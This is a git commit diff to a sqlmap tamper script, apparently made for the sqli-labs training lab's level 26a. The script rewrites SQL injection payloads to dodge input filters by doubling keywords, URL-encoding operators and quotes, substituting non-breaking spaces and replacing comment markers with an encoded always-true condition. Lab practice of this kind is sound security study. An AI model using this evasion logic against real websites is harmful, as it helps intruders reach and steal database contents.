6b83120f075f346cbc24b823a1169282100fc4af
Hausa_ <572157852@qq.com>
2022-09-19 16:54:01 +0800

    less26a

--- security/sqliLab/less26atamper.py
+++ security/sqliLab/less26atamper.py
@@ -8,6 +8,5 @@ def dependencies():
 
 def tamper(payload, **kwargs):
     if payload:
-        result = payload.replace("OR", "oorr").replace("AND", "%26%26").replace("\'","%27").replace(" ","%A0").replace("-- -",'%26%26%A0%271%27%3D%271')\
-            .replace("(","%28").replace(")","%29").replace(",","%2C").replace("=","%3D")
+        result = payload.replace("OR", "oorr").replace("AND", "%26%26").replace("\'","%27").replace(" ","%A0").replace("--%A0-",'%26%26%A0%28%271%27%29%3D%28%271').replace("(","%28").replace(")","%29").replace(",","%2C").replace("=","%3D")
         return result
